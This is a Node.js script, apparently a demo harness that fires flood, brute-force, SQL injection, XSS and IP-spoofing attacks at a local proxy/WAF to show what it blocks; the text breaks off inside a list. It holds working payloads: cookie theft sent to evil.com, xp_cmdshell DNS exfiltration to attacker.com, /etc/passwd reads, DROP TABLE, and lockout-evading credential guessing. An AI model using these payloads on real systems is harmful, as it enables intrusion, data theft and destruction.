/**
 * Open http://localhost:3000 on a projector.
 */

'use strict';

const http = require('http');
const url  = require('url');

const PROXY_PORT   = 9090;
const BACKEND_PORT = 8080;
const DEMO_PORT    = 3000;

// ── Attack runner ─────────────────────────────────────────────────────────────
function makeReq({ host = 'localhost', port = PROXY_PORT, method = 'GET', path = '/', body = null, headers = {}, spoofIP = null }) {
  return new Promise((resolve) => {
    const opts = {
      hostname: host, port, path, method,
      headers: { 'Content-Type': 'application/json', ...headers, ...(spoofIP ? { 'X-Forwarded-For': spoofIP } : {}) },
      timeout: 6000
    };
    const req = http.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve({ status: res.statusCode, body: JSON.parse(data) }); } catch { resolve({ status: res.statusCode, body: { raw: data } }); } });
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 408, error: 'Timeout' }); });
    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

// ── Attack scenarios ──────────────────────────────────────────────────────────
async function runAttack(type) {
  const log = [];
  const add = (emoji, label, status, note, blocked) =>
    log.push({ emoji, label, status, note, blocked, ts: Date.now() });
//---------old version
  /*if (type === 'ddos') {
    const promises = Array.from({ length: 50 }, (_, i) =>
      makeReq({ path: '/getAllUsers' }).then(r => {
        add(r.status === 429 ? '⚡' : '✓', `Request #${i+1} → /getAllUsers`, r.status,
          r.status === 429 ? 'BLOCKED: Rate limit' : 'Passed', r.status === 429);
      })
    );
    await Promise.all(promises);
    log.sort((a, b) => a.ts - b.ts);
  }*/
//---------new version for ddos attack
    if (type === 'ddos') {
  const TOTAL_REQUESTS = 200;        // More requests for realistic stress test
  const CONCURRENCY = 20;            // Max parallel requests at a time
  const PATHS = [                    // Rotate across multiple endpoints
    '/getAllUsers',
    '/getUser/1',
    '/api/data',
    '/admin/stats',
  ];

  // Helper: chunk array into batches
  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // Build all request descriptors
  const requests = Array.from({ length: TOTAL_REQUESTS }, (_, i) => ({
    index: i + 1,
    path: PATHS[i % PATHS.length],   // Round-robin across paths
    delay: Math.floor(i / CONCURRENCY) * 10, // Slight stagger per batch (ms)
  }));

  const results = [];

  // Process in controlled batches (concurrency limiting)
  for (const batch of chunk(requests, CONCURRENCY)) {
    const batchResults = await Promise.allSettled(
      batch.map(({ index, path, delay }) =>
        new Promise(resolve => setTimeout(resolve, delay))
          .then(() => makeReq({ path }))
          .then(r => {
            const blocked = r.status === 429;
            const entry = {
              index,
              path,
              status: r.status,
              blocked,
              label: blocked ? '⚡ BLOCKED' : '✓ PASSED',
              note: blocked ? 'Rate limit triggered' : 'Request passed through',
              ts: Date.now(),
            };
            add(blocked ? '⚡' : '✓', `Request #${index} → ${path}`, r.status, entry.note, blocked);
            return entry;
          })
          .catch(err => {
            // Network errors / timeouts also matter in DDoS testing
            const entry = {
              index,
              path,
              status: 0,
              blocked: false,
              label: '✗ ERROR',
              note: err.message || 'Network error / timeout',
              ts: Date.now(),
            };
            add('✗', `Request #${index} → ${path}`, 0, entry.note, false);
            return entry;
          })
      )
    );

    // Collect fulfilled results
    batchResults.forEach(r => {
      if (r.status === 'fulfilled') results.push(r.value);
    });
  }

  // Sort by timestamp
  results.sort((a, b) => a.ts - b.ts);

  // --- Summary Report ---
  const blocked = results.filter(r => r.blocked).length;
  const passed  = results.filter(r => !r.blocked && r.status !== 0).length;
  const errors  = results.filter(r => r.status === 0).length;

  console.table({
    'Total Requests': TOTAL_REQUESTS,
    'Blocked (429)':  blocked,
    'Passed Through': passed,
    'Errors/Timeouts': errors,
    'Block Rate':     `${((blocked / TOTAL_REQUESTS) * 100).toFixed(1)}%`,
  });

  log.sort((a, b) => a.ts - b.ts);
}
//------------old version of bruteforce attack
 /* else if (type === 'bruteforce') {
    const passwords = ['password','123456','admin','letmein','qwerty','monkey','football','iloveyou','qwerty123','dragon'];
    for (let i = 0; i < passwords.length; i++) {
      const r = await makeReq({ method: 'POST', path: '/login', body: { username: 'admin', password: passwords[i] } });
      add(r.status === 429 ? '⚡' : r.status === 401 ? '🔒' : '✓',
        `Login attempt #${i+1} — pwd: "${passwords[i]}"`, r.status,
        r.status === 429 ? 'BLOCKED: Brute force detected' : r.status === 401 ? 'Wrong password (hit backend)' : 'SUCCESS',
        r.status === 429);
      await new Promise(r => setTimeout(r, 80));
    }
  }*/

    //----------new version of bruteforce attack
    else if (type === 'bruteforce') {

  // --- Config ---
  const CONFIG = {
    delay: { min: 50, max: 300 },     // Random delay range (ms) — mimics human/tool variance
    concurrency: 3,                    // Parallel attempts (realistic for slow-mode attacks)
    lockoutThreshold: 3,               // Stop a username after N consecutive 429s
    rotateUsernames: true,             // Cycle usernames to evade per-account lockout
  };

  // Expanded, categorized wordlist
  const WORDLIST = {
    common:   ['password', '123456', 'admin', 'letmein', 'qwerty', 'monkey', 'iloveyou', 'dragon'],
    patterns: ['admin123', 'password1', 'pass@123', 'abc@1234', 'Admin@1', 'P@ssw0rd'],
    targeted: ['admin@2024', 'gateway123', 'proxy@admin', 'apigate', 'reverseproxy'],
  };

  const ALL_PASSWORDS = [...WORDLIST.common, ...WORDLIST.patterns, ...WORDLIST.targeted];

  const USERNAMES = CONFIG.rotateUsernames
    ? ['admin', 'administrator', 'root', 'superuser', 'api_admin']
    : ['admin'];

  // Track per-username consecutive lockouts
  const lockoutCount = Object.fromEntries(USERNAMES.map(u => [u, 0]));
  const skipped = [];
  const results = [];

  // Random delay helper
  const jitter = () => new Promise(res =>
    setTimeout(res, CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min))
  );

  // Chunk helper for concurrency
  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // Build attempt queue: [username, password] pairs
  const attempts = ALL_PASSWORDS.flatMap(pwd =>
    USERNAMES.map(usr => ({ username: usr, password: pwd }))
  );

  let attemptNumber = 0;

  for (const batch of chunk(attempts, CONFIG.concurrency)) {
    const batchPromises = batch.map(async ({ username, password }) => {
      attemptNumber++;

      // Skip locked-out usernames
      if (lockoutCount[username] >= CONFIG.lockoutThreshold) {
        skipped.push({ username, password, reason: 'Lockout threshold reached' });
        add('⏭', `Skipped #${attemptNumber} — ${username}:"${password}"`, '—',
          'Skipped: username locked out', false);
        return;
      }

      await jitter(); // Randomized delay before each attempt

      let r;
      try {
        r = await makeReq({
          method: 'POST',
          path: '/login',
          body: { username, password },
          headers: {
            // Rotate User-Agents to simulate different clients
            'User-Agent': [
              'Mozilla/5.0 (Windows NT 10.0)',
              'curl/7.68.0',
              'python-requests/2.28',
              'Hydra/9.4',
            ][attemptNumber % 4],
          },
        });
      } catch (err) {
        add('✗', `Error #${attemptNumber} — ${username}:"${password}"`, 0, err.message, false);
        return;
      }

      const status = r.status;
      const isBlocked = status === 429;
      const isWrong   = status === 401;
      const isSuccess = status === 200 || status === 204;

      // Update lockout counter
      if (isBlocked) lockoutCount[username]++;
      else lockoutCount[username] = 0; // Reset on non-429

      const icon  = isBlocked ? '⚡' : isWrong ? '🔒' : isSuccess ? '🚨' : '✗';
      const note  = isBlocked ? 'BLOCKED: Brute force detected'
                  : isWrong   ? 'Wrong password — reached backend'
                  : isSuccess ? `SUCCESS: ${username}/${password}`
                  :             `Unexpected status ${status}`;

      add(icon, `Attempt #${attemptNumber} — ${username}:"${password}"`, status, note, isBlocked);

      results.push({ attemptNumber, username, password, status, isBlocked, isWrong, isSuccess, ts: Date.now() });

      // Early exit if credentials found
      if (isSuccess) {
        console.warn(`🚨 CRITICAL: Valid credentials found → ${username}:${password}`);
        return 'FOUND'; // signal to outer loop if needed
      }
    });

    const batchResults = await Promise.allSettled(batchPromises);

    // Stop entire test if credentials were found
    if (batchResults.some(r => r.value === 'FOUND')) break;
  }

  // --- Summary ---
  const blocked  = results.filter(r => r.isBlocked).length;
  const wrong    = results.filter(r => r.isWrong).length;
  const success  = results.filter(r => r.isSuccess).length;
  const total    = results.length + skipped.length;

  console.table({
    'Total Attempts':    total,
    'Skipped (lockout)': skipped.length,
    'Blocked (429)':     blocked,
    'Wrong pwd (401)':   wrong,
    'Successful logins': success,
    'Block Rate':        `${((blocked / results.length || 0) * 100).toFixed(1)}%`,
    'Lockout Coverage':  `${Object.values(lockoutCount).filter(v => v >= CONFIG.lockoutThreshold).length}/${USERNAMES.length} usernames`,
  });

  log.sort((a, b) => a.ts - b.ts);
}
//-------old version of sql injection attack
  /*else if (type === 'sqlinject') {
    const payloads = [
      ["/getAllUsers?id=1 OR 1=1",       "OR 1=1 bypass"],
      ["/getAllUsers?q='; DROP TABLE users;--", "DROP TABLE attack"],
      ["/search?name=admin' UNION SELECT * FROM passwords--", "UNION SELECT"],
      ["/login",                          "SQL in body", 'POST', { username: "admin'--", password: "x" }],
      ["/api?filter=1; DELETE FROM orders", "DELETE injection"],
      ["/products?q=1 EXEC xp_cmdshell('ls')", "xp_cmdshell"],
    ];
    for (const [path, label, method, body] of payloads) {
      const r = await makeReq({ method: method || 'GET', path, body: body || null });
      add(r.status === 400 ? '🛡' : '⚠', label, r.status,
        r.status === 400 ? 'BLOCKED: WAF — SQL Injection' : '⚠ Reached backend!', r.status === 400);
      await new Promise(r => setTimeout(r, 100));
    }
  }*/

    //--------new version of sql injection attack
    else if (type === 'sqlinject') {

  // --- Config ---
  const CONFIG = {
    delay: { min: 60, max: 250 },       // Jitter to evade timing-based WAF rules
    concurrency: 2,                      // Low concurrency = stealthy, realistic
    stopOnCritical: false,               // Set true to halt on any backend leak
  };

  // --- Expanded, categorized payload library ---
  const PAYLOADS = {

    classic: [
      { path: '/getAllUsers?id=1 OR 1=1',              label: 'OR 1=1 bypass',          method: 'GET'  },
      { path: '/getAllUsers?id=1 OR 1=1--',            label: 'OR 1=1 with comment',     method: 'GET'  },
      { path: '/getAllUsers?id=1 OR \'1\'=\'1\'',      label: 'String OR bypass',        method: 'GET'  },
      { path: '/getAllUsers?id=0 OR 1=1#',             label: 'MySQL hash comment',      method: 'GET'  },
    ],

    union: [
      { path: '/search?name=admin\' UNION SELECT NULL--',                    label: 'UNION NULL probe',          method: 'GET' },
      { path: '/search?name=admin\' UNION SELECT NULL,NULL--',               label: 'UNION 2-col probe',         method: 'GET' },
      { path: '/search?name=1\' UNION SELECT username,password FROM users--',label: 'UNION credential dump',     method: 'GET' },
      { path: '/api?q=1 UNION SELECT table_name FROM information_schema.tables--', label: 'Schema enumeration', method: 'GET' },
    ],

    destructive: [
      { path: '/getAllUsers?q=\'; DROP TABLE users;--',          label: 'DROP TABLE',            method: 'GET' },
      { path: '/api?filter=1; DELETE FROM orders--',             label: 'DELETE rows',           method: 'GET' },
      { path: '/api?filter=1; TRUNCATE TABLE sessions;--',       label: 'TRUNCATE sessions',     method: 'GET' },
      { path: '/api?id=1; UPDATE users SET role=\'admin\'--',    label: 'Privilege escalation',  method: 'GET' },
    ],

    blind: [
      { path: '/getAllUsers?id=1 AND SLEEP(5)',                   label: 'MySQL time-based blind',    method: 'GET' },
      { path: '/getAllUsers?id=1 AND 1=IF(1=1,SLEEP(5),0)',      label: 'MySQL conditional sleep',   method: 'GET' },
      { path: '/api?id=1; WAITFOR DELAY \'0:0:5\'--',            label: 'MSSQL time-based blind',    method: 'GET' },
      { path: '/api?id=1 AND 1=(SELECT 1 FROM users WHERE SLEEP(3)=0)', label: 'Subquery sleep', method: 'GET' },
    ],

    outOfBand: [
      { path: '/api?id=1; EXEC xp_cmdshell(\'nslookup attacker.com\')--', label: 'xp_cmdshell DNS exfil',  method: 'GET' },
      { path: '/api?id=1 UNION SELECT LOAD_FILE(\'/etc/passwd\')--',       label: 'File read (LOAD_FILE)',  method: 'GET' },
      { path: '/api?id=1 INTO OUTFILE \'/tmp/shell.php\'--',               label: 'File write (OUTFILE)',   method: 'GET' },
    ],

    encodingEvasion: [
      { path: '/getAllUsers?id=1%20OR%201%3D1',                  label: 'URL-encoded OR 1=1',      method: 'GET' },
      { path: '/getAllUsers?id=1/**/OR/**/1=1',                  label: 'Comment-obfuscated OR',   method: 'GET' },
      { path: '/getAllUsers?id=1%27%20OR%20%271%27%3D%271',      label: 'Double URL-encoded',      method: 'GET' },
      { path: '/getAllUsers?id=1\' /*!OR*/ \'1\'=\'1',           label: 'MySQL inline comment',    method: 'GET' },
    ],

    postBody: [
      { path: '/login',   label: 'SQLi in username field',    method: 'POST', body: { username: "admin'--",              password: 'x'          } },
      { path: '/login',   label: 'OR bypass in body',         method: 'POST', body: { username: "' OR '1'='1",           password: "' OR '1'='1"} },
      { path: '/login',   label: 'UNION in password field',   method: 'POST', body: { username: 'admin',                 password: "' UNION SELECT null--" } },
      { path: '/api/data',label: 'JSON body SQLi',            method: 'POST', body: { filter: "1; DROP TABLE sessions--", page: 1               } },
    ],

    secondOrder: [
      { path: '/register', label: 'Second-order: register payload', method: 'POST', body: { username: "admin'--", email: 'x@x.com', password: 'test' } },
      { path: '/profile',  label: 'Second-order: retrieve payload', method: 'GET'  },
    ],
  };

  const ALL_PAYLOADS = Object.entries(PAYLOADS).flatMap(([category, items]) =>
    items.map(p => ({ ...p, category }))
  );

  // --- Helpers ---
  const jitter = () => new Promise(res =>
    setTimeout(res, CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min))
  );

  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // Classify response risk level
  const classify = (status, responseTime) => {
    if (status === 400 || status === 403)  return { icon: '🛡', verdict: 'BLOCKED by WAF',           critical: false, risk: 'safe'     };
    if (status === 500)                    return { icon: '💥', verdict: 'SERVER ERROR — likely leak', critical: true,  risk: 'critical' };
    if (status === 200 && responseTime > 4000) return { icon: '⏱', verdict: 'TIME-BASED BLIND HIT',  critical: true,  risk: 'critical' };
    if (status === 200)                    return { icon: '⚠️', verdict: 'REACHED BACKEND — inspect!', critical: true,  risk: 'high'     };
    if (status === 401 || status === 404)  return { icon: '🔒', verdict: 'Auth/Not found — low risk', critical: false, risk: 'low'      };
    return                                        { icon: '❓', verdict: `Unexpected: ${status}`,     critical: false, risk: 'unknown'  };
  };

  const results = [];
  let attemptNum = 0;
  let criticalFound = false;

  // --- Main loop ---
  for (const batch of chunk(ALL_PAYLOADS, CONFIG.concurrency)) {
    if (criticalFound && CONFIG.stopOnCritical) break;

    await Promise.allSettled(
      batch.map(async ({ path, label, method, body, category }) => {
        attemptNum++;
        await jitter();

        const t0 = Date.now();
        let r;

        try {
          r = await makeReq({
            method: method || 'GET',
            path,
            body: body || null,
            headers: {
              // Vary headers to probe WAF evasion surface
              'X-Forwarded-For': `10.0.0.${Math.floor(Math.random() * 254) + 1}`,
              'User-Agent': ['sqlmap/1.7', 'Mozilla/5.0', 'curl/7.88'][attemptNum % 3],
              'Content-Type': body ? 'application/json' : undefined,
            },
          });
        } catch (err) {
          add('✗', `[${category}] #${attemptNum} ${label}`, 0, `Network error: ${err.message}`, false);
          return;
        }

        const responseTime = Date.now() - t0;
        const { icon, verdict, critical, risk } = classify(r.status, responseTime);

        if (critical) criticalFound = true;

        const entry = {
          num: attemptNum,
          category,
          label,
          path,
          method: method || 'GET',
          status: r.status,
          responseTime,
          verdict,
          critical,
          risk,
          ts: Date.now(),
        };

        results.push(entry);

        add(
          icon,
          `[${category.toUpperCase()}] #${attemptNum} — ${label}`,
          `${r.status} (${responseTime}ms)`,
          verdict,
          !critical   // isBlocked = true when NOT critical (i.e., WAF caught it)
        );
      })
    );
  }

  // --- Summary ---
  const byRisk = (level) => results.filter(r => r.risk === level).length;
  const byCategory = [...new Set(results.map(r => r.category))].map(cat => ({
    category: cat,
    total: results.filter(r => r.category === cat).length,
    blocked: results.filter(r => r.category === cat && !r.critical).length,
    leaked:  results.filter(r => r.category === cat && r.critical).length,
  }));

  console.table({
    'Total Payloads':     results.length,
    'Blocked by WAF':     byRisk('safe'),
    'Low Risk':           byRisk('low'),
    'High Risk (leaked)': byRisk('high'),
    'CRITICAL':           byRisk('critical'),
    'Unknown':            byRisk('unknown'),
    'Avg Response (ms)':  Math.round(results.reduce((s, r) => s + r.responseTime, 0) / results.length),
  });

  console.table(byCategory);

  if (criticalFound) {
    console.warn('🚨 CRITICAL: One or more payloads reached the backend or triggered a server error. WAF rules need immediate review.');
  }

  log.sort((a, b) => a.ts - b.ts);
}
//----------old version of xss attack
  else if (type === 'xss') {
    const payloads = [
      ['/search?q=<script>alert(document.cookie)</script>', '<script> tag'],
      ['/page?url=javascript:alert(1)',                    'javascript: URI'],
      ['/comment', 'onerror handler', 'POST', { text: '<img src=x onerror=alert(1)>' }],
      ['/search?q="><svg onload=fetch("evil.com/steal?c="+document.cookie)>', 'SVG onload exfil'],
      ['/api?cb=eval(atob("YWxlcnQoMSk="))',              'eval() base64'],
    ];
    for (const [path, label, method, body] of payloads) {
      const r = await makeReq({ method: method || 'GET', path, body: body || null });
      add(r.status === 400 ? '🛡' : '⚠', label, r.status,
        r.status === 400 ? 'BLOCKED: WAF — XSS' : '⚠ Reached backend!', r.status === 400);
      await new Promise(r => setTimeout(r, 100));
    }
  }
//-----------new version of xss attack
else if (type === 'xss') {

  // --- Config ---
  const CONFIG = {
    delay: { min: 50, max: 200 },     // Jitter to evade timing-based WAF detection
    concurrency: 3,                    // Low = stealthy; raise for stress testing
    stopOnCritical: false,             // Halt entire test on first backend leak
    trackResponseBody: true,           // Flag if payload string echoed back in response
  };

  // --- Payload Library (8 categories) ---
  const PAYLOADS = {

    scriptTag: [
      { path: '/search?q=<script>alert(document.cookie)</script>',              label: 'Basic script tag + cookie theft'     },
      { path: '/search?q=<script>alert(1)</script>',                            label: 'Minimal script tag'                  },
      { path: '/search?q=<SCRIPT>alert(1)</SCRIPT>',                            label: 'Uppercase tag evasion'               },
      { path: '/search?q=<scr<script>ipt>alert(1)</scr</script>ipt>',          label: 'Nested tag obfuscation'              },
      { path: '/search?q=<script/src=//evil.com/xss.js>',                      label: 'Remote script load'                  },
    ],

    eventHandlers: [
      { path: '/search?q="><img src=x onerror=alert(1)>',                       label: 'onerror on broken image'             },
      { path: '/search?q="><body onload=alert(1)>',                             label: 'onload body injection'               },
      { path: '/search?q="><input autofocus onfocus=alert(1)>',                 label: 'onfocus autofocus'                   },
      { path: '/search?q="><video><source onerror=alert(1)>',                   label: 'video source onerror'                },
      { path: '/search?q="><details open ontoggle=alert(1)>',                   label: 'details ontoggle (no click needed)'  },
      { path: '/search?q="><marquee onstart=alert(1)>',                         label: 'marquee onstart (legacy)'            },
    ],

    uriSchemes: [
      { path: '/page?url=javascript:alert(document.cookie)',                    label: 'javascript: URI scheme'              },
      { path: '/page?url=data:text/html,<script>alert(1)</script>',             label: 'data: URI with script'               },
      { path: '/redirect?to=vbscript:alert(1)',                                 label: 'vbscript: URI (IE legacy)'           },
      { path: '/page?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', label: 'data: URI base64 encoded'   },
    ],

    domClobbering: [
      { path: '/search?q=<img name=cookie src=x>',                              label: 'DOM clobbering: name=cookie'         },
      { path: '/search?q=<form id=defaultView><input name=cookie>',             label: 'DOM clobbering: form defaultView'    },
      { path: '/search?q=<a id=location href=javascript:alert(1)>click</a>',   label: 'DOM clobbering: location override'   },
    ],

    templateInjection: [
      { path: '/search?q={{constructor.constructor(\'alert(1)\')()}}',          label: 'Angular template injection'          },
      { path: '/search?q=${alert(1)}',                                          label: 'JS template literal injection'       },
      { path: '/search?q=#{alert(1)}',                                          label: 'Ruby/ERB template injection'         },
      { path: '/search?q=<%= alert(1) %>',                                      label: 'EJS/ERB tag injection'               },
    ],

    encodingEvasion: [
      { path: '/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',                 label: 'URL-encoded script tag'              },
      { path: '/search?q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',      label: 'HTML entity encoded'                 },
      { path: '/search?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',   label: 'Unicode escape sequence'             },
      { path: '/search?q=<script>\\u0061lert(1)</script>',                     label: 'Mixed unicode inside script'         },
      { path: '/api?cb=eval(atob("YWxlcnQoMSk="))',                            label: 'eval(atob()) base64 payload'         },
      { path: '/search?q=<iframe src="javascript:&#97;lert(1)">',              label: 'Entity mixed with JS URI'            },
    ],

    svgAndMath: [
      { path: '/search?q="><svg onload=fetch(`//evil.com?c=${document.cookie})>', label: 'SVG onload cookie exfil'          },
      { path: '/search?q=<svg><script>alert(1)</script></svg>',                 label: 'Script inside SVG'                  },
      { path: '/search?q=<math><mtext></p><script>alert(1)</script>',          label: 'MathML namespace confusion'          },
      { path: '/search?q=<svg><animate onbegin=alert(1) attributeName=x>',     label: 'SVG animate onbegin'                 },
      { path: '/search?q=<svg><use href="data:image/svg+xml,<svg id=\'x\'><script>alert(1)</script></svg>#x">', label: 'SVG use href injection' },
    ],

    postBody: [
      { path: '/comment',  label: 'onerror in comment body',     method: 'POST', body: { text:    '<img src=x onerror=alert(1)>'                            } },
      { path: '/comment',  label: 'Stored script tag',           method: 'POST', body: { text:    '<script>document.location="//evil.com?c="+document.cookie</script>' } },
      { path: '/profile',  label: 'XSS in display name',         method: 'POST', body: { name:    '"><script>alert(1)</script>'                             } },
      { path: '/feedback', label: 'Polyglot XSS payload',        method: 'POST', body: { message: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e' } },
      { path: '/api/data', label: 'XSS via JSON field',          method: 'POST', body: { query:   '<script>alert(document.domain)</script>', page: 1       } },
      { path: '/search',   label: 'XSS in Content-Type header',  method: 'POST', body: { q:       'test' },
        headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset="><script>alert(1)</script>' } },
    ],

  };

  const ALL_PAYLOADS = Object.entries(PAYLOADS).flatMap(([category, items]) =>
    items.map(p => ({ ...p, category, method: p.method || 'GET', body: p.body || null }))
  );

  // --- Helpers ---
  const jitter = () => new Promise(res =>
    setTimeout(res, CONFIG.delay.min + Math.random() * (CONFIG.delay.max - CONFIG.delay.min))
  );

  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // Risk classifier — maps status + response hints to severity
  const classify = (status, responseText = '', responseTime = 0) => {
    const echoed = CONFIG.trackResponseBody &&
      responseText && ALL_PAYLOADS.some(p =>
        responseText.includes('<script') ||
        responseText.includes('onerror')  ||
        responseText.includes('onload')
      );

    if (status === 400 || status === 403)
      return { icon: '🛡', verdict: 'BLOCKED by WAF',                    critical: false, risk: 'safe'     };
    if (echoed)
      return { icon: '🚨', verdict: 'REFLECTED — payload echoed back!',  critical: true,  risk: 'critical' };
    if (status === 500)
      return { icon: '💥', verdict: 'SERVER ERROR — possible injection',  critical: true,  risk: 'critical' };
    if (status === 200)
      return { icon: '⚠️', verdict: 'REACHED BACKEND — inspect response', critical: true,  risk: 'high'     };
    if (status === 301 || status === 302)
      return { icon: '↪️', verdict: 'Redirect — check Location header',   critical: false, risk: 'medium'   };
    if (status === 404 || status === 401)
      return { icon: '🔒', verdict: 'Auth/Not found — low risk',          critical: false, risk: 'low'      };
    return   { icon: '❓', verdict: `Unexpected status: ${status}`,       critical: false, risk: 'unknown'  };
  };

  const results = [];
  let attemptNum = 0;
  let criticalFound = false;

  // --- Main loop ---
  for (const batch of chunk(ALL_PAYLOADS, CONFIG.concurrency)) {
    if (criticalFound && CONFIG.stopOnCritical) break;

    await Promise.allSettled(
      batch.map(async ({ path, label, method, body, category, headers: extraHeaders }) => {
        attemptNum++;
        await jitter();

        const t0 = Date.now();
        let r, responseText = '';

        try {
          r = await makeReq({
            method,
            path,
            body,
            headers: {
              'User-Agent':      ['Mozilla/5.0', 'curl/7.88', 'python-requests/2.28'][attemptNum % 3],
              'X-Forwarded-For': `10.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
              'Referer':         `https://evil.com/xss-test-${attemptNum}`,
              'Accept':          'text/html,application/xhtml+xml',
              ...extraHeaders,
            },
          });

          // Try to read response body for reflection detection
          try { responseText = typeof r.text === 'function' ? await r.text() : (r.body || ''); } catch (_) {}

        } catch (err) {
          add('✗', `[${category}] #${attemptNum} — ${label}`, 0, `Network error: ${err.message}`, false);
          return;
        }

        const responseTime = Date.now() - t0;
        const { icon, verdict, critical, risk } = classify(r.status, responseText, responseTime);

        if (critical) criticalFound = true;

        const entry = {
          num: attemptNum, category, label, path, method,
          status: r.status, responseTime, verdict, critical, risk,
          echoed: responseText.includes('<script') || responseText.includes('onerror'),
          ts: Date.now(),
        };

        results.push(entry);

        add(
          icon,
          `[${category.toUpperCase()}] #${attemptNum} — ${label}`,
          `${r.status} (${responseTime}ms)`,
          verdict,
          !critical
        );
      })
    );
  }

  // --- Summary ---
  const byRisk   = level => results.filter(r => r.risk === level).length;
  const reflected = results.filter(r => r.echoed).length;

  const byCategory = [...new Set(results.map(r => r.category))].map(cat => ({
    category: cat,
    total:    results.filter(r => r.category === cat).length,
    blocked:  results.filter(r => r.category === cat && r.risk === 'safe').length,
    critical: results.filter(r => r.category === cat && r.critical).length,
  }));

  console.table({
    'Total Payloads':      results.length,
    'Blocked by WAF':      byRisk('safe'),
    'Low Risk':            byRisk('low'),
    'Medium (redirects)':  byRisk('medium'),
    'High (reached backend)': byRisk('high'),
    'CRITICAL (reflected)':byRisk('critical'),
    'Reflected payloads':  reflected,
    'Avg Response (ms)':   Math.round(results.reduce((s, r) => s + r.responseTime, 0) / results.length),
  });

  console.table(byCategory);

  if (criticalFound) {
    console.warn('🚨 CRITICAL: One or more XSS payloads reached the backend or were reflected. Immediate WAF rule review required.');
  }

  log.sort((a, b) => a.ts - b.ts);
}
//-------old version of blacklist evasion attack
  /*else if (type === 'blacklist') {
    const ips = [
      ['203.0.113.42', 'Known attacker IP'],
      ['198.51.100.0',  'Banned bot network'],
      ['1.2.3.4',       'Clean IP (should pass)'],
      ['10.0.0.5',      'Internal IP (should pass)'],
    ];
    for (const [ip, label] of ips) {
      const r = await makeReq({ path: '/getAllUsers', spoofIP: ip });
      add(r.status === 403 ? '⛔' : '✓', `${label} (${ip})`, r.status,
        r.status === 403 ? 'BLOCKED: IP Blacklisted' : 'Allowed — clean IP', r.status === 403);
      await new Promise(r => setTimeout(r, 150));
    }
  }*/

    //-------new version of blacklist evasion attack
    else if (type === 'blacklist') {

  // --- Config ---
  const CONFIG = {
    delay: { min: 80, max: 300 },       // Jitter between requests
    concurrency: 4,                      // Parallel checks
    testMultipleEndpoints: true,         // Test each IP across several routes
    trackBypassTechniques: true,         // Try header spoofing variants per IP
  };

  // --- IP Categories ---
  const IP_LIST = {

    knownAttackers: [
      { ip: '203.0.113.42',  label: 'Known attacker IP (TEST-NET-3)'   },
      { ip: '203.0.113.99',  label: 'Repeat offender — same /24 block' },
      { ip: '198.51.100.1',  label: 'Banned bot network (TEST-NET-2)'  },
      { ip: '198.51.100.55', label: 'Scanner IP — same /24 block'      },
      { ip: '192.0.2.1',     label: 'Blacklisted TEST-NET-1 IP'        },
    ],

    torAndProxy: [
      { ip: '185.220.101.1',  label: 'Tor exit node'                   },
      { ip: '185.220.101.45', label: 'Tor relay — same subnet'         },
      { ip: '104.244.72.1',   label: 'Known VPN provider IP'           },
      { ip: '45.142.212.10',  label: 'Datacenter proxy IP'             },
    ],

    cidrBlock: [
      { ip: '203.0.113.0',   label: 'CIDR /24 base — should block'    },
      { ip: '203.0.113.128', label: 'CIDR /24 mid — should block'     },
      { ip: '203.0.113.255', label: 'CIDR /24 broadcast — edge case'  },
    ],

    allowlisted: [
      { ip: '1.2.3.4',       label: 'Clean residential IP'             },
      { ip: '8.8.8.8',       label: 'Google DNS — always clean'        },
      { ip: '1.1.1.1',       label: 'Cloudflare DNS — always clean'    },
    ],

    internal: [
      { ip: '10.0.0.5',      label: 'Internal RFC1918 — should pass'  },
      { ip: '172.16.0.1',    label: 'Private range 172.16/12'         },
      { ip: '192.168.1.1',   label: 'LAN gateway — should pass'       },
      { ip: '127.0.0.1',     label: 'Loopback — edge case'            },
    ],

    ipv6: [
      { ip: '::1',                              label: 'IPv6 loopback'               },
      { ip: '2001:db8::1',                      label: 'IPv6 documentation range'    },
      { ip: '::ffff:203.0.113.42',              label: 'IPv4-mapped IPv6 (blacklisted IPv4)' },
      { ip: 'fe80::1',                          label: 'IPv6 link-local'             },
    ],

    spoofingAttempts: [
      { ip: '203.0.113.42',  label: 'Blacklisted — X-Forwarded-For spoof',    headerKey: 'X-Forwarded-For'    },
      { ip: '203.0.113.42',  label: 'Blacklisted — X-Real-IP spoof',          headerKey: 'X-Real-IP'          },
      { ip: '203.0.113.42',  label: 'Blacklisted — CF-Connecting-IP spoof',   headerKey: 'CF-Connecting-IP'   },
      { ip: '203.0.113.42',  label: 'Blacklisted — True-Client-IP spoof',     headerKey: 'True-Client-IP'     },
      { ip: '203.0.113.42',  label: 'Blacklisted — X-Originating-IP spoof',   headerKey: 'X-Originating-IP'   },
      { ip: '1.2.3.4',       label: 'Clean IP — verify no false block on spoof', headerKey: 'X-Forwarded-For' },
    ],

    chaining: [
      { ip: '203.0.113.42', label: 'Chain: blacklisted,clean (first wins?)',  headerKey: 'X-Forwarded-For', chainWith: '1.2.3.4'       },
